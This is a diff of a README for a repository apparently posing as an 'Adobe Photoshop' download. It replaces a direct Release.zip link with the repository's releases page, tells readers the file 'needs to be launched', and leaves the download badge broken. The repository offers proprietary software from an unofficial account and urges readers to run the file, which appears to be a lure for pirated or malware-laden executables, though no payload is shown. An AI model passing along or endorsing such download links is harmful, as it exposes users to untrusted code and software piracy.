@@ -52,9 +52,9 @@ Adobe Photoshop is a graphic design powerhouse that offers a wide range of featu
   - pixel-perfect-results
   - professional-image-editing
 
-For the latest release, download the software [here](https://github.com/releases/789694263/Release.zip) *(needs to be launched)*.
+For the latest release, download the software [here](https://github.com/naufalmustari/Adobe-Photoshop/releases) *(needs to be launched)*.
 
-[![Download Photoshop](https://img.shields.io/badge/Download-Photoshop-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Photoshop](https://github.com/naufalmustari/Adobe-Photoshop/releases)](https://github.com/naufalmustari/Adobe-Photoshop/releases)
 
 ---
 
